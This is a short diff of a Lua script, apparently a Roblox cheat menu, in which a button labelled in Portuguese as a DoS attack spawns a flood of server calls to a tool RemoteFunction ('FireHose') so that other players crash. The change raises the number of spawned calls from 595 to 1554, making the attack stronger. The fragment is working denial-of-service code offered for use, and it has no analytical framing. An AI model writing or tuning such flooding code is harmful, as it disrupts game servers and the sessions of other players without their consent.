@@ -693,7 +693,7 @@ MainTab:CreateButton({
             pcall(function() starterGui:SetCore("SendNotification", { Title = "Ataque DoS Iniciado", Text = "Aguarde os jogadores Crashar", Button1 = "Ok", Duration = 5 }) end)
 
             task.spawn(function()
-                for m = 1, 595 do
+                for m = 1, 1554 do
                     task.spawn(function()
                         if toolRemote:IsA("RemoteFunction") then
                             toolRemote:InvokeServer("PickingTools", "FireHose")
